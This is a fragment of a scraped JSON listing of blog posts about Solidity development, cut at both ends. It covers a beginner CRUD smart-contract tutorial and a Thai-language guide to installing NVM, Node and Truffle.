next\u00a0level.", "responses": "4"}, {"title": "Working with Strings in\u00a0Solidity", "author_name": "Aventus Network", "link": "https://hackernoon.com/working-with-strings-in-solidity-c4ff6d5f8008?source=search_post", "post_date": "Jul 17, 2018", "readtime": "9 min read", "upvotes": "74", "content": "Working with Strings in\u00a0SolidityAventus NetworkBlockedUnblockFollowFollowingJul 17, 2018This is the first in a series of blogs we\u2019re going to bring to you directly from the trenches, going into some of the nitty-gritty technical detail of some of the things we\u2019re doing with the Protocol at the moment.Today\u2019s article comes from Alex Pinto, a recent addition to the Aventus blockchain engineering team who\u2019s been spending the past few weeks getting up to speed on using Solidity, and will take us through some of the challenges and particularities of the language.", "responses": "2"}, {"title": "Solidity CRUD Tutorial, Part 1\u200a\u2014\u200aBuilding a Smart Contract with CRUD Operations", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/solidity-crud-tutorial-part-1-building-a-smart-contract-with-crud-operations-55fc2bc5240?source=search_post", "post_date": "Oct 9, 2018", "readtime": "6 min read", "upvotes": "55", "content": "Solidity CRUD Tutorial, Part 1\u200a\u2014\u200aBuilding a Smart Contract with CRUD OperationsLearn how to build a simple smart contract on Ethereum and how to test it using Truffle frameworkGaurav AgrawalBlockedUnblockFollowFollowingOct 9, 2018*This tutorial is targeted to beginner audience and Do not use this code/pattern in a production setting. Also, look into more in Solidity\u2019s common patterns*Today, we will learn how to build a simple smart contract on Ethereum and how to test it using Truffle framework. Our smart contract will perform basic create, read, update, delete (CRUD) operations.Table of\u00a0ContentsQuick definitionsBuilding a smart contract with CRUD operationsTesting CRUD smart contract using Truffle (Part 2)Quick DefinitionsWhat is Ethereum?\u200a\u2014\u200aEthereum is an open source smart contract platform on which you can build decentralized applications (Dapps).What is Solidity?\u200a\u2014\u200aSolidity is one of the most famous language to code smart contract on ethereum. It is designed for smart contract programming. It\u2019s syntactically similar to javascript.What is a smart contract? -In simple words, A smart contract is a piece of code which controls some kind of digital asset. It defines rules for transferring asset and penalties like a traditional contract. The best thing is that it automatically perform these transfers and penalties based on pre-coded conditions without a need for a middleman.Building a smart contract with CRUD operationsOur smart contract is very simple and basic in nature. It will store countries, their leaders and population.Fun Fact\u200a\u2014\u200a\u201cAccording to the United Nations & the CIA World Fact Book, there are 195 Countries recognized by the World.\u201dIt can be optimized but the mantra is \ud83d\udc47Andy is Eng. manager at Google and works on Google chrome projectSo let\u2019s dive in.curdApp.solFor convenience I have added our CRUD Smart contract above now we will go through the code and understand different aspect of our CrudApp and basic solidity language programming.Think of a \u2018contract\u2019 as a \u2018class\u2019 in other programming languages.Pragma\u200a\u2014\u200aIt specifies which compiler version should be used. This only works after solidity version 0.4.0.Solidity Data\u00a0TypesStruct\u200a\u2014\u200aUsing struct keyword you can define structures in Solidity. A structure is a user-defined data type that can be used to group items of possibly different types into a single type. Our structure will store country related properties.namecountrypopulationstruct country{ string name; string leader; uint256 population; }We are using strings to store country name and their leader\u2019s name and uint256 datatype to store the population of the country. We are storing our countries in an Array. (Where we\u2019ll perform all our CRUD operations)uint256 public totalCountries;       function CurdApp() public{       totalCountries = 0;   }We are using a variable to track the number of countries and then initializing it on the constructor with 0.Events- With the help of events, we can utilize EVM\u2019s logging facility. Use eventkeyword following the event name and parameter to define events. We have defined 3 events for the operations which modify our stored.event CountryEvent(string countryName , string leader, uint256 population);event LeaderUpdated(string countryName , string leader);event CountryDelete(string countryName);Create Operation -Now let\u2019s look at our insert function which is storing new countries.function insert( string countryName, string leader,  uint256 population) public   returns (uint256 totalCountries){     country memory newCountry = country(countryName , leader, population);        countries.push(newCountry);        totalCountries++;            emit CountryEvent (countryName, leader, population);        return totalCountries;   }This function taking 3 parameters and returning a number of total countries after completing the function.We didn\u2019t add basic checks, add them and comment your code on the response.Operations and Storage are costly on ethereum. So we are declaring a temporary struct with the use of memory keyword then we will push it on countries array which we defined above. After that, we log our event using emit keyword. That\u2019s it a simple straightforward creation of our first entry.Read operation \u2014Now we want to read what we have stored. So let\u2019s read countries data using country name. Our function simply iterates through entries and returns details if a positive match found.function getCountry(string countryName) public view returns(string name , string leader , uint256 population){        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name, countryName)){              return (countries[i].name , countries[i].leader , countries[i].population);           }       }       revert('country not found');   }Revert()\u200a\u2014\u200aEthereum operations take gas (ether) to run, so we need to optimize that. Revert function check condition and revert unused gas to the user. They should be used at the start so your function will use less gas.revert(\u2018Something bad happened\u2019);Solidity provides two more functions assert() and require(). But discussing them is out of scope for this tutorial. You can find an awesome write us about it here.View modifier- Above, we added in view modifier in function. By adding view, we simply mean that function is not modifying any state and just reading the current state. In other words, it\u2019s a read-only function.Solidity has a bunch of modifiers and you can also create your own modifiers. Here\u2019s a list of conditions for a statement to be considered as \u201cmodifying the state\u201d:State variables being written to.Events being emitted.Other contracts being created.Self-destruct being used.Ether being sent via calls.Calling functions that are not marked view or pure.Low-level calls being used.An inline assembly containing certain opcodes being usedUpdate operation -Now let\u2019s update our countries data. For example, we want to change Trump with Hilary \ud83d\ude1c.function updateLeader(string countryName, string newLeader) public returns (bool success){       //This has a problem we need loop       for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name ,countryName)){              countries[i].leader = newLeader;              emit LeaderUpdated(countryName, newLeader);              return true;           }       }       return false;   }It\u2019s taking 2 parameters and running a loop to find the country in our countries array. If there is a positive match, It replaces the leader with your input leader.Same way, you can create an updatePopulation function and comments on the response.Delete Operation \u2014Now let\u2019s look at delete operation. In our delete we are removing the country which user wants and replacing it with last entry in our countries array.function deleteCountry(string countryName) public returns(bool success){        require(totalCountries > 0);        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name , countryName)){              countries[i] = countries[totalCountries-1];               delete countries[totalCountries-1];               totalCountries--;               countries.length--;              //emit event              emit CountryDelete(countryName);              return true;           }       }       return false;   }Other functions-We have created some other functions too. One of comparing the string and other for giving the length of our array.function compareStrings (string a, string b)  internal pure returns (bool){       return keccak256(a) == keccak256(b);   }        function getTotalCountries() public view returns (uint256 length){      return countries.length;   }If you followed till now, let do some google search too. Respond in comments why we used keccak256() while comparing two strings?In next part we will test out CRUD smart contract with help of truffle framework.Notes & suggestions -Smart contract controls assets, so they should be designed carefully and should follow a minimalistic approach. They should be properly audited in a production scenario for controlling assets. Smart contracts are the trust central of a decentralized app and the autonomous part of the system.Blockchains are not just a database. Blockchain maintains a global state. Every change has to reflect on every node participating in the network, so changes are costly.In the above tutorial, we used basic CRUD operation. Our crud design has few weak points, optimize it and let us know in the comment section. Operations are costly on Ethereum and you should minimize them while coding a smart contract.On To Part\u00a02\u2026", "responses": "4"}, {"title": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 1\u00a0: \u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e43\u0e2b\u0e49\u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19\u0e20\u0e32\u0e29\u0e32 Solidity \u0e14\u0e49\u0e27\u0e22 VSCode, Truffle, Infura \u0e41\u0e25\u0e30\u00a0Ganache", "author_name": "Methus Kaewsaikao", "link": "https://medium.com/cochain/ethereum-%E0%B8%95%E0%B8%AD%E0%B8%99%E0%B8%97%E0%B8%B5%E0%B9%88-1-%E0%B8%95%E0%B8%B4%E0%B8%94%E0%B8%95%E0%B8%B1%E0%B9%89%E0%B8%87%E0%B9%80%E0%B8%84%E0%B8%A3%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%87%E0%B9%83%E0%B8%AB%E0%B9%89%E0%B8%9E%E0%B8%A3%E0%B9%89%E0%B8%AD%E0%B8%A1%E0%B9%80%E0%B8%82%E0%B8%B5%E0%B8%A2%E0%B8%99%E0%B8%A0%E0%B8%B2%E0%B8%A9%E0%B8%B2-solidity-%E0%B8%94%E0%B9%89%E0%B8%A7%E0%B8%A2-vscode-truffle-infura-%E0%B9%81%E0%B8%A5%E0%B8%B0-1af5189650c4?source=search_post", "post_date": "May 9", "readtime": "5 min read", "upvotes": "207", "content": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 1\u00a0: \u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e43\u0e2b\u0e49\u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19\u0e20\u0e32\u0e29\u0e32 Solidity \u0e14\u0e49\u0e27\u0e22 VSCode, Truffle, Infura \u0e41\u0e25\u0e30\u00a0GanacheMethus KaewsaikaoBlockedUnblockFollowFollowingMay 9\u0e43\u0e19\u0e1a\u0e17\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e1a\u0e19 Ethereum \u0e14\u0e49\u0e27\u0e22\u0e20\u0e32\u0e29\u0e32 Solidity \u0e01\u0e31\u0e19\u0e04\u0e23\u0e31\u0e1a\u0e42\u0e14\u0e22\u0e40\u0e19\u0e37\u0e49\u0e2d\u0e2b\u0e32\u0e08\u0e30\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22NVM \u0e41\u0e25\u0e30 NodeJSTruffleMetamaskInfuraGanache\u0e25\u0e2d\u0e07 Deploy Smart Contract \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Chain1. NVM \u0e41\u0e25\u0e30\u00a0NodeJS\u0e02\u0e2d\u0e2d\u0e18\u0e34\u0e1a\u0e32\u0e22\u0e2a\u0e31\u0e49\u0e19 \u0e46 \u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e04\u0e19\u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19 NodeJS \u0e21\u0e32\u0e01\u0e48\u0e2d\u0e19\u0e41\u0e25\u0e30\u0e2d\u0e32\u0e08\u0e08\u0e30\u0e44\u0e21\u0e48\u0e21\u0e35 Node \u0e43\u0e19\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07NodeJS \u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e23\u0e35\u0e22\u0e01\u0e2a\u0e31\u0e49\u0e19 \u0e46 \u0e27\u0e48\u0e32 Node \u0e04\u0e37\u0e2d Javascript Runtime Environment \u0e1e\u0e39\u0e14\u0e07\u0e48\u0e32\u0e22 \u0e46 \u0e01\u0e47\u0e04\u0e37\u0e2d\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e23\u0e31\u0e19\u0e20\u0e32\u0e29\u0e32 Javascript \u0e17\u0e35\u0e48 Server \u0e2a\u0e32\u0e40\u0e2b\u0e15\u0e38\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49\u0e40\u0e1e\u0e23\u0e32\u0e30\u0e27\u0e48\u0e32 Truffle \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Framework \u0e17\u0e35\u0e48\u0e19\u0e34\u0e22\u0e21\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Solidity \u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49 Node \u0e04\u0e23\u0e31\u0e1aNVM \u0e04\u0e37\u0e2d Version Manager \u0e02\u0e2d\u0e07 Node \u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01\u0e1a\u0e32\u0e07\u0e04\u0e23\u0e31\u0e49\u0e07\u0e01\u0e32\u0e23\u0e17\u0e33\u0e07\u0e32\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49 Node \u0e41\u0e15\u0e01\u0e15\u0e48\u0e32\u0e07\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e01\u0e31\u0e19\u0e44\u0e1b\u0e43\u0e19\u0e41\u0e15\u0e48\u0e25\u0e30\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04 \u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49 NVM \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e44\u0e1b\u0e21\u0e32\u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e25\u0e07 NVMcurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash\u0e43\u0e0a\u0e49 NVM \u0e25\u0e07 Node 10.15nvm install 10.15nvm use 10.15\u0e25\u0e2d\u0e07\u0e17\u0e14\u0e2a\u0e2d\u0e1a\u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e32\u0e21\u0e20\u0e32\u0e1e2. Truffle\u0e15\u0e48\u0e2d\u0e44\u0e1b\u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e07 Framework \u0e0a\u0e37\u0e48\u0e2d Truffle \u0e0b\u0e36\u0e48\u0e07\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23 Develop Solidity \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e21\u0e48\u0e43\u0e0a\u0e49 Truffle \u0e40\u0e25\u0e22\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e40\u0e0a\u0e48\u0e19\u0e43\u0e0a\u0e49 Remix IDE \u0e41\u0e15\u0e48 Truffle \u0e0a\u0e48\u0e27\u0e22\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e17\u0e33\u0e07\u0e32\u0e19\u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e40\u0e1e\u0e23\u0e32\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e17\u0e2a\u0e44\u0e14\u0e49\u0e17\u0e33 Migration \u0e44\u0e14\u0e49\u0e15\u0e48\u0e2d\u0e01\u0e31\u0e1a Ethereum Chain \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e17\u0e33 Plugin, \u0e40\u0e02\u0e35\u0e22\u0e19 Pipeline \u0e44\u0e14\u0e49\u0e21\u0e35 Console \u0e43\u0e2b\u0e49 Interact \u0e01\u0e31\u0e1a Contract \u0e17\u0e35\u0e48 Deploy \u0e44\u0e1b\u0e41\u0e25\u0e49\u0e27\u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e1b\u0e25. \u0e2a\u0e34\u0e48\u0e07\u0e17\u0e35\u0e48 Truffle \u0e44\u0e21\u0e48\u0e21\u0e35\u0e41\u0e15\u0e48 Remix IDE \u0e21\u0e35\u0e2b\u0e25\u0e31\u0e01 \u0e46 \u0e01\u0e47\u0e04\u0e37\u0e2d Debugger \u0e41\u0e15\u0e48\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e25\u0e07\u0e41\u0e22\u0e01\u0e44\u0e14\u0e49\u0e43\u0e19 VSCode\u0e1b\u0e25. 2 \u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e41\u0e25\u0e49\u0e27\u0e01\u0e32\u0e23\u0e40\u0e17\u0e35\u0e22\u0e1a Truffle \u0e01\u0e31\u0e1a Remix \u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e16\u0e39\u0e01\u0e19\u0e31\u0e01 \u0e04\u0e27\u0e23\u0e08\u0e30\u0e40\u0e17\u0e35\u0e22\u0e1a Remix \u0e01\u0e31\u0e1a VScode \u0e08\u0e30\u0e40\u0e2b\u0e21\u0e32\u0e30\u0e01\u0e27\u0e48\u0e32\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 RemixIDE \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e1a\u0e32\u0e07\u0e01\u0e23\u0e13\u0e35\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 VSCode + Solidity Plugin + Truffle Project (\u0e14\u0e49\u0e32\u0e19\u0e0b\u0e49\u0e32\u0e22)\u0e1b\u0e25 3. \u0e2a\u0e32\u0e40\u0e2b\u0e15\u0e38\u0e17\u0e35\u0e48\u0e1c\u0e21\u0e43\u0e0a\u0e49 VSCode \u0e2b\u0e25\u0e31\u0e01 \u0e46 \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e21\u0e35 Vim Mode 55555 \u0e2a\u0e48\u0e27\u0e19\u0e43\u0e04\u0e23\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e15\u0e31\u0e27\u0e44\u0e2b\u0e19\u0e40\u0e02\u0e35\u0e22\u0e19\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e04\u0e48\u0e2b\u0e32 Plugin \u0e43\u0e19\u0e01\u0e32\u0e23 Highligh Syntax \u0e02\u0e2d\u0e07 Solidity \u0e44\u0e1b\u0e43\u0e2a\u0e48\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a VSCode \u0e1c\u0e21\u0e43\u0e0a\u0e49 Plugin \u0e0a\u0e37\u0e48\u0e2d SolidityInstall Truffle \u0e14\u0e49\u0e27\u0e22\u00a0NPMNPM \u0e04\u0e37\u0e2d Package Manager \u0e02\u0e2d\u0e07 NodeJS \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e14\u0e49\u0e21\u0e32\u0e14\u0e49\u0e27\u0e22\u0e15\u0e2d\u0e19\u0e25\u0e07 NodeJS \u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e21\u0e31\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e25\u0e07 Truffle CLInpm install -g truffle\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e25\u0e07\u0e41\u0e25\u0e49\u0e27\u0e25\u0e2d\u0e07\u0e23\u0e31\u0e19 truffle\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e2d\u0e07\u0e2a\u0e23\u0e49\u0e32\u0e07 Project Metacoin \u0e02\u0e2d\u0e07 Truffle \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07 \u0e42\u0e14\u0e22\u0e40\u0e23\u0e34\u0e48\u0e21\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c\u0e0a\u0e37\u0e48\u0e2d Metacoin \u0e41\u0e25\u0e49\u0e27\u0e23\u0e31\u0e19 truffle unbox metacoinmkdir Metacoincd Metacointruffle unbox metacoin\u0e2b\u0e23\u0e37\u0e2d\u0e16\u0e49\u0e32\u0e43\u0e04\u0e23\u0e2d\u0e22\u0e32\u0e01\u0e44\u0e14\u0e49\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e40\u0e1b\u0e25\u0e48\u0e32 \u0e46 \u0e01\u0e47\u0e43\u0e2b\u0e49\u0e23\u0e31\u0e19 truffle init \u0e41\u0e15\u0e48\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Metacoin \u0e01\u0e48\u0e2d\u0e19\u0e40\u0e1e\u0e23\u0e32\u0e30\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e17\u0e14\u0e2a\u0e2d\u0e1a Environment \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e0b\u0e15\u0e43\u0e19\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e02\u0e2d\u0e07 Truffle \u0e08\u0e30\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c\u0e17\u0e35\u0e48\u0e2a\u0e33\u0e04\u0e31\u0e0d\u0e04\u0e37\u0e2dcontracts \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c soliditymigrations \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c migration \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e01\u0e32\u0e23 Deploytest \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e17\u0e2a\u0e2a\u0e48\u0e27\u0e19 folder build \u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23 build \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e16\u0e39\u0e01\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34 \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e41\u0e01\u0e49\u0e44\u0e02\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07\u0e17\u0e35\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e14\u0e39\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48\u0e2a\u0e33\u0e04\u0e31\u0e0d\u0e01\u0e31\u0e19contracts/Migrations.solMigrations.sol\u0e44\u0e1f\u0e25\u0e4c Migration \u0e40\u0e1b\u0e47\u0e19\u0e44\u0e1f\u0e25\u0e4c Contract \u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49\u0e40\u0e01\u0e47\u0e1a State \u0e02\u0e2d\u0e07 Migration \u0e02\u0e2d\u0e07 Contract \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32 Deploy \u0e2d\u0e35\u0e01\u0e17\u0e35 \u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e41\u0e01\u0e49\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49contracts/MetaCoin.sol \u0e41\u0e25\u0e30\u0e44\u0e1f\u0e25\u0e4c\u00a0.sol \u0e2d\u0e37\u0e48\u0e19\u00a0\u0e46\u0e44\u0e1f\u0e25\u0e4c\u00a0.sol \u0e2d\u0e37\u0e48\u0e19 \u0e46 \u0e04\u0e37\u0e2d\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e40\u0e0a\u0e48\u0e19 \u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19 HelloWorld Contract \u0e40\u0e23\u0e32\u0e01\u0e47\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c HelloWorld.sol \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e2d\u0e35\u0e01\u0e2d\u0e31\u0e19\u0e2b\u0e19\u0e36\u0e48\u0e07migrations/2_deploy_contracts.js\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e43\u0e0a\u0e49\u0e1a\u0e2d\u0e01\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e08\u0e30 deploy contract \u0e2d\u0e30\u0e44\u0e23\u0e1a\u0e49\u0e32\u0e07 \u0e42\u0e14\u0e22\u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e14\u0e49\u0e27\u0e22 truffle init \u0e08\u0e30\u0e44\u0e21\u0e48\u0e21\u0e35\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49 \u0e41\u0e25\u0e30\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e40\u0e2d\u0e07\u0e2a\u0e31\u0e07\u0e40\u0e01\u0e15\u0e27\u0e48\u0e32\u0e08\u0e30\u0e21\u0e35\u0e40\u0e25\u0e02 2 \u0e02\u0e49\u0e32\u0e07\u0e2b\u0e19\u0e49\u0e32\u0e19\u0e31\u0e48\u0e19\u0e04\u0e37\u0e2d state \u0e02\u0e2d\u0e07 Migrations.sol \u0e42\u0e14\u0e22\u0e21\u0e31\u0e19\u0e08\u0e30\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e17\u0e33\u0e01\u0e32\u0e23 Migrate \u0e44\u0e1b\u0e01\u0e35\u0e48\u0e04\u0e23\u0e31\u0e49\u0e07 \u0e16\u0e36\u0e07\u0e02\u0e31\u0e49\u0e19\u0e44\u0e2b\u0e19\u0e41\u0e25\u0e49\u0e27 \u0e40\u0e0a\u0e48\u0e19 1, 2\u00a0,3 \u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27\u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49 Deploy Contract \u0e15\u0e48\u0e2d\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e01\u0e31\u0e19\u0e2b\u0e25\u0e32\u0e22 \u0e46 \u0e04\u0e23\u0e31\u0e49\u0e07\u0e43\u0e19\u0e40\u0e27\u0e25\u0e32\u0e19\u0e32\u0e19 \u0e40\u0e23\u0e32\u0e01\u0e47\u0e21\u0e31\u0e01\u0e08\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c 2_deploy_contracts.js \u0e40\u0e1e\u0e35\u0e22\u0e07\u0e41\u0e04\u0e48\u0e44\u0e1f\u0e25\u0e4c\u0e40\u0e14\u0e35\u0e22\u0e27\u0e16\u0e49\u0e32\u0e43\u0e04\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 truffle init \u0e41\u0e25\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19 Contract \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32 \u0e2d\u0e22\u0e48\u0e32\u0e25\u0e37\u0e21\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e41\u0e25\u0e30\u0e41\u0e01\u0e49\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e43\u0e2b\u0e49\u0e16\u0e39\u0e01\u0e14\u0e49\u0e27\u0e22tests/\u0e44\u0e1f\u0e25\u0e4c\u0e40\u0e17\u0e2a\u0e08\u0e30\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22 2 \u0e23\u0e39\u0e1b\u0e41\u0e1a\u0e1a\u0e04\u0e37\u0e2dJavascript Test (.js)\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e17\u0e2a\u0e08\u0e32\u0e01\u0e20\u0e32\u0e22\u0e19\u0e2d\u0e01 Contract \u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19\u0e01\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 ApplicationSolidity Test (.sol) \u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e17\u0e2a\u0e15\u0e31\u0e27 Contract 